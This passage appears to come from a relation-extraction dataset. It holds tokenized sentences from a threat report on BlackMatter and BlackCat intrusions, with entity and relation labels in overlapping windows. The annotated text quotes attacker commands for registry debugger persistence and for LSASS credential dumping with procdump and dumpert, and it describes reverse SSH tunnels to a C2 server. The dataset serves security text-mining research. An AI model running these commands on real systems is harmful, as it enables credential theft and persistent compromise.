6, "global_pos": [91, 91], "name": "BlackMatter attack", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [95, 95], "name": "group", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [101, 101], "name": "GOST", "pos": [12, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [109, 109], "name": "GOST", "pos": [0, 1], "index": "5_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [127, 127], "name": "C2 server", "pos": [18, 20], "index": "6_0"}]], "labels": [{"r": "WR", "evidence": [2], "h": 0, "t": 1}, {"r": "WR", "evidence": [6], "h": 3, "t": 4}, {"r": "ST", "evidence": [6, 7], "h": 2, "t": 6}, {"r": "RF", "evidence": [6, 7], "h": 2, "t": 6}, {"r": "CO", "evidence": [6], "h": 2, "t": 3}, {"r": "CO", "evidence": [6, 7], "t": 4, "h": 5}]}, {"title": "029-7", "sents": [["c", ":", "\\windows\\system32\\schtasks.exe", "/run", "/tn", "microsoft\\windows\\wininet\\cachetask"], ["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "attackers", "pos": [12, 13], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [31, 31], "name": "registry", "pos": [25, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [85, 85], "name": "BlackMatter attack", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [89, 89], "name": "group", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [95, 95], "name": "GOST", "pos": [12, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [103, 103], "name": "GOST", "pos": [0, 1], "index": "5_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [121, 121], "name": "C2 server", "pos": [18, 20], "index": "6_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [131, 131], "name": "system.exe", "pos": [7, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [144, 144], "name": "BlackCat attack", "pos": [20, 22], "index": "8_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [5], "h": 3, "t": 4}, {"r": "ST", "evidence": [5, 6], "h": 2, "t": 6}, {"r": "RF", "evidence": [5, 6], "h": 2, "t": 6}, {"r": "EX", "evidence": [5, 6, 7], "h": 3, "t": 7}, {"r": "CO", "evidence": [5], "h": 2, "t": 3}, {"r": "CO", "evidence": [5, 6], "t": 4, "h": 5}, {"r": "WR", "evidence": [6, 7], "t": 5, "h": 8}, {"r": "ST", "evidence": [6, 7], "t": 6, "h": 8}, {"r": "RF", "evidence": [6, 7], "t": 6, "h": 8}, {"r": "RD", "evidence": [7], "t": 7, "h": 8}]}, {"title": "029-8", "sents": [["To", "ensure", "persistent", "execution", "of", "the", "malicious", "file", "on", "a", "system", ",", "attackers", "also", "made", "use", "of", "the", "``", "image", "file", "execution", "option", "''", "debugger", "registry", "key", "."], ["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "attackers", "pos": [12, 13], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [25, 25], "name": "registry", "pos": [25, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "BlackMatter attack", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [83, 83], "name": "group", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "GOST", "pos": [12, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [97, 97], "name": "GOST", "pos": [0, 1], "index": "5_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [115, 115], "name": "C2 server", "pos": [18, 20], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [125, 125], "name": "system.exe", "pos": [7, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [138, 138], "name": "BlackCat attack", "pos": [20, 22], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [153, 153], "name": "attackers", "pos": [10, 11], "index": "9_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [155, 155], "name": "logs", "pos": [12, 13], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [4], "h": 3, "t": 4}, {"r": "ST", "evidence": [4, 5], "h": 2, "t": 6}, {"r": "RF", "evidence": [4, 5], "h": 2, "t": 6}, {"r": "EX", "evidence": [4, 5, 6], "h": 3, "t": 7}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 2, "t": 10}, {"r": "CO", "evidence": [4], "h": 2, "t": 3}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 2, "t": 9}, {"r": "CO", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "WR", "evidence": [5, 6], "t": 5, "h": 8}, {"r": "ST", "evidence": [5, 6], "t": 6, "h": 8}, {"r": "RF", "evidence": [5, 6], "t": 6, "h": 8}, {"r": "RD", "evidence": [6], "t": 7, "h": 8}, {"r": "RD", "evidence": [6, 7], "h": 8, "t": 10}, {"r": "RD", "evidence": [6, 7], "h": 8, "t": 10}, {"r": "WR", "evidence": [6, 7], "h": 8, "t": 10}, {"r": "WR", "evidence": [7], "h": 9, "t": 10}]}, {"title": "029-9", "sents": [["By", "adding", "this", "key", "to", "the", "system", "'s", "registry", "with", "a", "specific", "command", ",", "they", "ensured", "that", "the", "malicious", "file", "would", "be", "executed", "continuously", "."], ["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [55, 55], "name": "group", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "GOST", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [69, 69], "name": "GOST", "pos": [0, 1], "index": "3_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [87, 87], "name": "C2 server", "pos": [18, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [97, 97], "name": "system.exe", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [110, 110], "name": "BlackCat attack", "pos": [20, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [125, 125], "name": "attackers", "pos": [10, 11], "index": "7_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [127, 127], "name": "logs", "pos": [12, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [147, 147], "name": "Gmer", "pos": [5, 6], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [3], "h": 1, "t": 2}, {"r": "ST", "evidence": [3, 4], "h": 0, "t": 4}, {"r": "RF", "evidence": [3, 4], "h": 0, "t": 4}, {"r": "EX", "evidence": [3, 4, 5], "h": 1, "t": 5}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 0, "t": 8}, {"r": "CO", "evidence": [3], "h": 0, "t": 1}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 0, "t": 7}, {"r": "CO", "evidence": [3, 4], "t": 2, "h": 3}, {"r": "WR", "evidence": [4, 5], "t": 3, "h": 6}, {"r": "ST", "evidence": [4, 5], "t": 4, "h": 6}, {"r": "RF", "evidence": [4, 5], "t": 4, "h": 6}, {"r": "RD", "evidence": [5], "t": 5, "h": 6}, {"r": "RD", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "RD", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "WR", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "WR", "evidence": [6], "h": 7, "t": 8}, {"r": "WR", "evidence": [6, 7], "h": 7, "t": 9}]}, {"title": "029-10", "sents": [["Specifically", ",", "the", "command", "used", "was", ":"], ["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [26, 26], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [30, 30], "name": "group", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "GOST", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [44, 44], "name": "GOST", "pos": [0, 1], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [62, 62], "name": "C2 server", "pos": [18, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [72, 72], "name": "system.exe", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "BlackCat attack", "pos": [20, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "attackers", "pos": [10, 11], "index": "7_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [102, 102], "name": "logs", "pos": [12, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [122, 122], "name": "Gmer", "pos": [5, 6], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "ST", "evidence": [2, 3], "h": 0, "t": 4}, {"r": "RF", "evidence": [2, 3], "h": 0, "t": 4}, {"r": "EX", "evidence": [2, 3, 4], "h": 1, "t": 5}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 0, "t": 8}, {"r": "CO", "evidence": [2], "h": 0, "t": 1}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 0, "t": 7}, {"r": "CO", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 6}, {"r": "ST", "evidence": [3, 4], "t": 4, "h": 6}, {"r": "RF", "evidence": [3, 4], "t": 4, "h": 6}, {"r": "RD", "evidence": [4], "t": 5, "h": 6}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "WR", "evidence": [5, 6], "h": 7, "t": 9}]}, {"title": "029-11", "sents": [["c", ":", "\\windows\\system32\\reg.exe", "add", "hklm\\software\\microsoft\\windows", "nt\\currentversion\\image", "file", "execution", "options\\taskmgr.exe", "/v", "debugger", "/t", "reg_sz", "/d", "c", ":", "\\system"], ["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "group", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "GOST", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "GOST", "pos": [0, 1], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "C2 server", "pos": [18, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "system.exe", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "BlackCat attack", "pos": [20, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "attackers", "pos": [10, 11], "index": "7_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [95, 95], "name": "logs", "pos": [12, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "Gmer", "pos": [5, 6], "index": "9_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [150, 150], "name": "local and domain user credentials", "pos": [13, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [161, 161], "name": "Dumpert", "pos": [24, 25], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "EX", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 0, "t": 8}, {"r": "CO", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 7}, {"r": "CO", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 6}, {"r": "ST", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "RF", "evidence": [2, 3], "t": 4, "h": 6}, {"r": "RD", "evidence": [3], "t": 5, "h": 6}, {"r": "RD", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "RD", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "CD", "evidence": [4, 5, 6, 7], "h": 7, "t": 10}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 7, "t": 11}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 7, "t": 12}]}, {"title": "029-12", "sents": [["During", "the", "BlackMatter", "attack", ",", "the", "group", "utilized", "GO", "Simple", "Tunnel", "(", "GOST", ")", "to", "perform", "a", "similar", "technique", "."], ["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "group", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "GOST", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "GOST", "pos": [0, 1], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [38, 38], "name": "C2 server", "pos": [18, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "system.exe", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "BlackCat attack", "pos": [20, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "attackers", "pos": [10, 11], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [78, 78], "name": "logs", "pos": [12, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [98, 98], "name": "Gmer", "pos": [5, 6], "index": "9_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [133, 133], "name": "local and domain user credentials", "pos": [13, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [144, 144], "name": "Dumpert", "pos": [24, 25], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "EX", "evidence": [0, 1, 2], "h": 1, "t": 5}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 8}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "CO", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 6}, {"r": "ST", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "RF", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "RD", "evidence": [2], "t": 5, "h": 6}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "CD", "evidence": [3, 4, 5, 6], "h": 7, "t": 10}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 7, "t": 11}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 7, "t": 12}]}, {"title": "029-13", "sents": [["GOST", "is", "a", "Go-based", "tunneling", "tool", "that", "was", "employed", "to", "establish", "a", "reverse", "SSH", "tunnel", "to", "an", "attacker-controlled", "C2", "server", "."], ["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "GOST", "pos": [0, 1], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [18, 18], "name": "C2 server", "pos": [18, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "system.exe", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "BlackCat attack", "pos": [20, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "attackers", "pos": [10, 11], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [58, 58], "name": "logs", "pos": [12, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "Gmer", "pos": [5, 6], "index": "6_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [113, 113], "name": "local and domain user credentials", "pos": [13, 18], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [120, 120], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [124, 124], "name": "Dumpert", "pos": [24, 25], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RD", "evidence": [1], "t": 2, "h": 3}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "CD", "evidence": [2, 3, 4, 5], "h": 4, "t": 7}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 4, "t": 8}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 4, "t": 9}]}, {"title": "029-14", "sents": [["The", "deployed", "Gost", "file", "was", "named", "``", "system.exe", "''", ",", "which", "was", "similar", "to", "the", "file", "name", "used", "during", "the", "BlackCat", "attack", "for", "reverse-ssh", "."], ["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", "below", "."], ["Finally", ",", "the", "anti-rootkit", "tool", "Gmer", "was", "loaded", "into", "a", "limited", "number", "of", "key", "systems", "with", "the", "following", "command", ":"], ["c", ":", "\\users", "<", "username", ">", "\\downloads\\gmer\\gmer.exe"], ["The", "LSASS", "process", "memory", "was", "analyzed", "on", "several", "critical", "systems", "to", "retrieve", "both", "local", "and", "domain", "user", "credentials", "by", "utilizing", "Microsoft", "Sysinternals", "Procdump", "and", "Dumpert", "."], ["The", "following", "commands", "were", "used", "for", "this", "purpose", ":"], ["c", ":", "\\windows\\system\\procdump.exe", "-accepteula", "-ma", "lsass.exe", "lsass.dmp"], ["c", ":", "\\windows\\system\\dumpert.exe", "lsass.exe"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "system.exe", "pos": [7, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "BlackCat attack", "pos": [20, 22], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "attackers", "pos": [10, 11], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [37, 37], "name": "logs", "pos": [12, 13], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "Gmer", "pos": [5, 6], "index": "4_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [92, 92], "name": "local and domain user credentials", "pos": [13, 18], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "Microsoft Sysinternals Procdump", "pos": [20, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "Dumpert", "pos": [24, 25], "index": "7_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "CD", "evidence": [1, 2, 3, 4], "h": 2, "t": 5}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 2, "t": 6}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 2, "t": 7}]}, {"title": "029-15", "sents": [["Before", "setting", "up", "the", "reverse-ssh", "scheduled", "task", "tool", ",", "the", "attackers", "disabled", "logs", "for", "the", "task", "scheduler", ",", "as", "shown", "in", "the", "provided", "IOC", "section", 